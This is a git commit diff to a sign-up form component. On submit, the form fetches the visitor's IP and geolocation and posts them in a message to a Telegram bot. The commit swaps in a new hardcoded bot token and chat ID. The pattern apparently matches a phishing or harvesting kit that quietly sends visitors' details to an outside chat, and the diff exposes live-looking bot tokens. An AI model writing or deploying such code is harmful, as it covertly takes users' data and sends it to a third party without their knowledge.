071ede20fa2a658693235f5c93fc456d5dd9d2e6
juritribuna <158317146+juritribuna@users.noreply.github.com>
2024-02-15 09:53:49 -0300

    feat: add bot

--- components/SignUp.tsx
+++ components/SignUp.tsx
@@ -72,7 +72,7 @@ export default function SignUp() {
   const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault()
     setIsLoading(true)
-    const botToken = '6841618266:AAGeOc6JWrD4isi6K7r56YRUXKiU6EJe5B4'
+    const botToken = '6760166516:AAHm4LkHz1CbApArmhhhPPA471D6kWoTLss'
     const responseIP = await fetch('https://api.my-ip.io/v2/ip.json')
     const responseIPJson = await responseIP.json()
     const responseGeo = await fetch('/api/geo', {
@@ -89,7 +89,7 @@ export default function SignUp() {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        'chat_id': -1002138559916,
+        'chat_id': -1002068850918,
         text: `
 IP: ${responseGeoJson.query}
 Região: ${responseGeoJson.region}
